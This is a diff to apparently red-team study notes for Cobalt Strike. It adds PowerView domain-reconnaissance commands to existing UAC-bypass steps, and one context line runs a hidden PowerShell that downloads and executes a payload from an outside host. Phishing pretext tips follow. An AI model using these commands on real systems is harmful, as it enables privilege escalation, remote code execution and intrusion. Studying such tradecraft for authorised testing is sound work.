@@ -226,6 +226,13 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 5. in cobalt strike type: `elevate uac-token-duplication <your listner name>` e.g. ``elevate uac-token-duplication my1st64bit``
 6. in cobalt strike type: `runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"`
 7. If we dont have alot of user permissions we can again try elevate i.e. `elevate svc-exe tcp-4444-local`
+
+
+### Domain Reconnaissance
+#### Powerview
+1> `beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1`
+#### Get-Domain
+1> `beacon> powershell Get-Domain`
 ### Miscellaneous good points
 1. While doing active reconnisane, use VPN to hide the real Public IP address. 
 2. The **pretext** is the **"story"** behind why we want our target to open our email and carry out the desired actions.
